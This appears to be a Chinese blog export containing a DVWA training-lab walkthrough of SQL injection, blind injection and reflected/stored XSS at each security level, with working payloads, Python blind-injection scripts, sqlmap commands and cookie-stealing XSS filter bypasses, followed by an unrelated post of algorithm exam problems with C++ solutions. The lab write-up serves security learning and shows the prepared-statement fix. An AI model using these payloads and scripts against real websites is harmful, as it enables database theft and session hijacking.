.\\sqlmap.py -r .\\a.txt --batch -D dvwa -T flag -C fl4g --dump high这次用户输入与回显不在同一个页面，这只要是为了防止sqlmap这种自动化注入工具的攻击 注入直接使用low级别的payload： 1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; # 1&#x27; union select 1,group_concat(fl4g) from flag # 源码分析 &lt;?php if( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; 存在注入的语句只是在low级别的基础上加上了Limit限制了回显的行数，但是使用low级别的注入语句时会直接把Limit 1注释掉，所以完全与low级别一样。 SQL Injection (Blind)盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。 low手工加脚本查询成功返回的语句：User ID exists in the database. 查询失败返回的语句：User ID is MISSING from the database. 这样就可以利用提示信息确定，我们所查询的语句是否正确 首先确定盲注的语句 通过下面的测试，说明ascii函数是可以使用的，写注入的脚本，二分法更快点。 1&#x27; and ascii(substring(database(),1,1))&gt;50 # 提示 ：User ID exists in the database. 1&#x27; and ascii(substring(database(),1,1))&lt;50 # 提示： User ID is MISSING from the database. # -*- coding = utf - 8 -*- #@Time : 2020/10/26 17:29 #@Author : sunzy #@File : dvwa.py # 二分法盲注 import requests url = &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=&quot; header = &#123;&quot;Cookie&quot;: &quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;&#125; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #获取数据库名 #payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) #获取表名 #payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #获取列名 #payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #获取flag payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) url1 =url+payload+&quot;&amp;Submit=Submit#&quot; response = requests.post(url1,headers= header) if &quot;exists&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) 1.首先获取表名 使用payload: payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) 2.获取列名 使用payload payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) 3.获取flag 使用payload payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) sqlmappython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --dbs --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa --tables --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag --columns --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag -C fl4g --dump --batch medium手工加脚本与low级别不同，中级别提交数据是post类型，所以需要抓包后再提交。 id=1 and length(database())=4 #&amp;Submit=Submit 提示User ID exists in the database. id=1 and length(database())=5 #&amp;Submit=Submit User ID is MISSING from the database 所以思路还是与low级别一样，只不过脚本中提交数据的方式改为POST类型 直接上脚本 import requests url = &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; header = &#123;&quot;Cookie&quot;: &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;&#125; flag = &quot;&quot; t = &quot;&quot; sum=0 for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #payload = &quot;1 and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) #payload = &quot;1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #payload = &quot;1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) payload = &quot;1 and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) data = &#123;&#x27;id&#x27;: payload, &#x27;Submit&#x27;: &#x27;Submit&#x27;&#125; response = requests.post(url,headers = header,data=data) t = response.text if &quot;exists&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(mid) flag = flag + chr(mid) print(flag) sqlmappython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --dbs python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa --tables python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag --columns python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag -C fl4g --dump sqlmap中给了三种注入方式，并且给出了payload，可以基于给出的提示继续做下去 下面是sqlmap爆出的flag。 源码分析 &lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = mysql_real_escape_string( $id ); // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; //mysql_close(); &#125; ?&gt; mysql_real_escape_string() 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: \\x00, \\n, \\r, \\, &#39;, &quot; 和 \\x1a. 本质上跟low级别的没有太大的区别，只是将一些特殊字符转义，但是我们注入时没有用到这些字符，所以注入语句基本和low级别一样 highGET /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1 Host: 10.5.8.66 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Referer: http://10.5.8.66/dvwa/vulnerabilities/sqli/ Connection: close Cookie: id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 抓包后可以发现提交的参数id在cookie中，所以与中级别的方法不一样了，但是还是可以使用sqlmap注入。 手工加脚本通过手工测试发现是字符型注入，与low级别的脚本大同小异，只是将注入的位置改到了cookie的位置 import requests url = &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; t=&quot;&quot; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) id = payload header = &#123;&quot;Cookie&quot;: &quot;id=&quot;+payload+&quot;;&quot;+&quot;security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;&#125; #print(header) response = requests.post(url,headers = header) t = response.text if &quot;exists&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(mid) #print(t) flag = flag + chr(mid) print(flag) sqlmappython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 --dbs --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 -D dvwa --tables --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 -D dvwa -T flag --columns --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 -D dvwa -T flag -C fl4g --dump --batch sql注入防御通过查看impossible源码发现检测了id数据类型，使用了预编译绑定id变量，有效防止SQL注入，这些可以在以后编程中应用，以编写出更加安全的代码。 &lt;?php if( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $id = $_GET[ &#x27;id&#x27; ]; // Was a number entered? if(is_numeric( $id )) &#123; //检测提交的数据是否为数字类型 // Check the database $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );//预编译绑定了id变量 $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT ); $data-&gt;execute(); // Get results if( $data-&gt;rowCount() == 1 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; XSS (Reflected)low&lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;; &#125; ?&gt; 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。 先测试一下 &lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt; 获取cookie &lt;script&gt;alert(document.cookie);&lt;/script&gt; medium&lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 代码审计后可以发现是对输入的内容进行了过滤，将&lt;script&gt;替换为空，可以双写绕过，也可以大小写绕过。 构造payload： &lt;sCriPt&gt;alert(document.cookie)&lt;/script&gt; &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; //使用其他标签 &lt;IMG src=1 onerror=alert(document.cookie)&gt; high&lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 先代码审计，执行一个正则表达式的搜索和替换,其中 /&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i 是正则表达式 (.*) 表示贪婪匹配，/i 表示不区分大小写所以在High级别的代码中，所有关于 &lt;script&gt; 标签均被过滤删除了 ,可以使用其他的标签。 构造payload： &lt;IMG src=1 onerror=alert(document.cookie)&gt; XSS (Stored)low&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; 分析 isset() 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false trim() 函数作用为移除字符串两侧空白字符或其他预定义字符 stripslashes() 函数用于删除字符串中的反斜杠 mysqli_real_escape_string() 函数会对字符串中的特殊号(\\x00，\\n，\\r，\\，&#39;，&quot;，\\x1a) 进行转义 在代码中对message，name输入框内容 没有进行XSS方面的过滤和检查 且通过 query 语句插入到数据库中。所以存在存储型XSS漏洞 这里name ,message的输入框中都存在xss，所以两个位置都可以使用，但是name位置有字数限制，可以使用bp抓包修改 由于是存储型XSS,所以每次刷新页面都会弹出cookie。 medium&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; 分析$message = strip_tags( addslashes( $message ) ); $message = htmlspecialchars( $message ); $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 &lt;b&gt; 标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 htmlspecialchars() 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码 但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS，与反射型中级的一样的方法 payload 使用双写绕过，输入 &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; 使用大小写绕过，输入&lt;sCript&gt;alert(document.cookie)&lt;/script&gt; 输入其他标签，如 &lt;IMG src=1 onerror=alert(document.cookie)&gt; high&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; 分析$message = strip_tags( addslashes( $message ) ); $message = htmlspecialchars( $message ); $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 &lt;b&gt; 标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 htmlspecialchars() 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 name,执行一个正则表达式的搜索和替换,其中 /&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i 是正则表达式 (.*) 表示贪婪匹配，/i 表示不区分大小写所以在High级别的代码中，所有关于 &lt;script&gt; 标签均被过滤删除了 ,可以使用其他的标签。 只能换一个标签 &lt;IMG src=1 onerror=alert(document.cookie)&gt;","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"},{"name":"blind sql","slug":"blind-sql","permalink":"https://sunzhengyu99.github.io/tags/blind-sql/"}]},{"title":"算法上机复习","date":"2020-11-04T13:21:42.000Z","path":"2020/11/04/算法上机复习/","text":"最近算法实验要上机考试，所以还是准备一下吧(还不是因为自己太菜了) 16级题目问题 A: 星空梦想——鲁班题目描述鲁班七号是王者峡谷里的射手，站撸英雄。战场上的鲁班七号，机制强大的鲨嘴炮，立刻将挡在前路的任何物体轰飞。正如他所说的，“借你们的肉体试验下新发明的威力”。是的，这就是鲁班大师和他的天才机关造物鲁班七号。然而，鲁班最为致命的缺点是腿短，跑得慢，一个稍不留神，便会被刺客所击杀。 既然腿短，那么就来多多运动吧，跳跳台阶可还行？假设鲁班七号一次可以跳上1级台阶，但极限一次只能跳上2级台阶（腿短没办法，嘤嘤嘤）。鲁班七号现在从0级阶梯开始，最终跳上第n级的台阶，求总共有多少种跳法？ 输入多组测试用例。 第一行输入包含一个整数T（1&lt;=T&lt;=50），代表测试用例个数。 接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=50），代表鲁班最终跳上了第n级台阶。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表鲁班最终跳上第n级台阶的跳法种数。 样例输入3 3 4 50 样例输出3 5 20365011074 提示注意结果超过int范围，请用long long类型存储ans #include&lt;bits/stdc++.h&gt; using namespace std; const int N=50; long long f[N]; int main() &#123; f[0]=1,f[1]=1; for(int i=2;i&lt;=50;i++) &#123; f[i]=f[i-1]+f[i-2]; &#125; int n; cin&gt;&gt;n; while(n--) &#123; int m; cin&gt;&gt;m; cout&lt;&lt;f[m]&lt;&lt;endl; &#125; return 0; &#125; 问题 B: 午夜歌剧——元歌题目描述元歌是王者峡谷里的刺客。何谓至高机关之美呢？唯有以至高权力的手令太古奇迹重现人世，方能称得上啊。 是的，元歌擅长操控，所做傀儡能起到以假乱真的作用，今天元歌的傀儡变成你的初中数学老师，给你出个数学题：给你一个数字x，让你求出k7、k6、k5、k4、k3、k2、k1、k0（0&lt;=ki&lt;=9），使得以下等式1成立，最后根据等式2求出最终ans值。 等式1： 等式2： 输入多组测试用例。 第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 接下来T行，每一行包含一个整数x（1&lt;=x&lt;=1500000）。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最终运算结果。 样例输入3 7 143 3223193224 样例输出10 151 163311433223 提示测试数据均大于等于1，不用特判0 感觉图片等式有点问题，一开始没理解什么意思，后来看了学长的提示。本质就是进制转换。 #include&lt;bits/stdc++.h&gt; using namespace std; int t,m; void convert(int n) &#123; int c,r; r=n%7; c=n/7; if(c&gt;0) &#123; convert(c); cout&lt;&lt;r; &#125; else cout&lt;&lt;n; &#125; int main() &#123; cin&gt;&gt;t; while(t--) &#123; cin&gt;&gt;m; convert(m); cout&lt;&lt;endl; &#125; return 0; &#125; 问题 C: 圣诞恋歌——貂蝉题目描述貂蝉是王者峡谷里的法师/刺客，貂蝉打法一定要注意配合技能与被动。半肉出装加上蛇皮走位，往往可以1打5，轻松拿下5杀。语花印被动描述为：技能命中会为敌人叠加花之印记，叠加满4层后印记触发被动，会给自身回复生命，同时会对周围敌人造成真实伤害并减速。我们现在对貂蝉的技能及被动进行简化如下：每使用1次技能会攻击1次目标，每攻击3次目标，会自动额外攻击1次目标。现在，貂蝉在游戏中使用了n次技能，请问总共会给目标带来多少次攻击。 输入多组测试数据，第一行输入包含一个整数T，代表测试样例个数。接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=100），代表貂蝉使用了n次技能。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表貂蝉对目标进行了ans次攻击。 样例输入6 1 2 3 45 81 样例输出1 2 4 57 121 提示这题就是汽水瓶的改编。。。 #include&lt;bits/stdc++.h&gt; using namespace std; int main() &#123; int n; cin&gt;&gt;n; while(n--) &#123; int m,sum; cin&gt;&gt;m; sum=0; while(m&gt;3) &#123; m=m-2; sum=sum+3; &#125; if(m==3) sum+=4; else sum=m; cout&lt;&lt;sum&lt;&lt;endl; &#125; return 0; &#125; 问题 D: 海之征途——孙策题目描述孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。 现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。 输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。 样例输入2 10 4 3 5 2 4 20 9 3 5 2 4 6 1 8 5 9 样例输出3 6 提示就是简单的装在问题 #include&lt;bits/stdc++.h&gt; using namespace std; int T,m,n; int w[1005]; int main() &#123; cin&gt;&gt;T; while(T--) &#123; int ans=0; cin&gt;&gt;m&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;w[i]; &#125; sort(w,w+n); for(int i=0;i&lt;n;i++) &#123; if(m&gt;=w[i]) &#123; ans++; m-=w[i]; &#125; else break; &#125; cout&lt;&lt;ans&lt;&lt;endl; &#125; return 0; &#125; 问题 E: 极冰防御——盾山题目描述盾山是王者峡谷里的辅助，一夫当关、万夫莫开，一个好的辅助往往可以给团队带来极大帮助。 盾山的游戏中的一个技能为不动如山：手握一块由石头组成的巨盾，张开巨盾砸向地面，将敌人推开，并持续一段时间。 假设盾山最多只能承受C重量的盾牌，而现在有N个小石头，每个石头i的重量为Wi，防御值为Pi。那么，呆萌的盾山想知道，他从N个小石头中挑选M个（M&lt;=N）组成他可承受盾牌，最大的防御值是多少？ 